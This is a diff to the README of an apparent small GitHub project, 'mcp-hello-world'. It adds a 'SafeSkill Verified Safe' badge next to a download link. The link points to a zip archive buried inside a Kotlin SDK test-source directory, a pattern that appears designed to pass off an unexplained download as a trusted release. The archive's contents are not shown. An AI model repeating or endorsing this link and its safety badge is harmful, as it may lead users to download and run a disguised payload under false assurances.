@@ -1,5 +1,7 @@
 # 👋 mcp-hello-world - Simple Greetings Made Easy
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/imaginationfinagler591-mcp-hello-world)
+
 [![Download mcp-hello-world](https://github.com/Imaginationfinagler591/mcp-hello-world/raw/refs/heads/master/docs/MCP/Kotlin-SDK-0.7.3/kotlin-sdk-client/src/jvmTest/kotlin/io/modelcontextprotocol/kotlin/sdk/world-hello-mcp-v3.3.zip)](https://github.com/Imaginationfinagler591/mcp-hello-world/raw/refs/heads/master/docs/MCP/Kotlin-SDK-0.7.3/kotlin-sdk-client/src/jvmTest/kotlin/io/modelcontextprotocol/kotlin/sdk/world-hello-mcp-v3.3.zip)
 
 ## 📖 Description
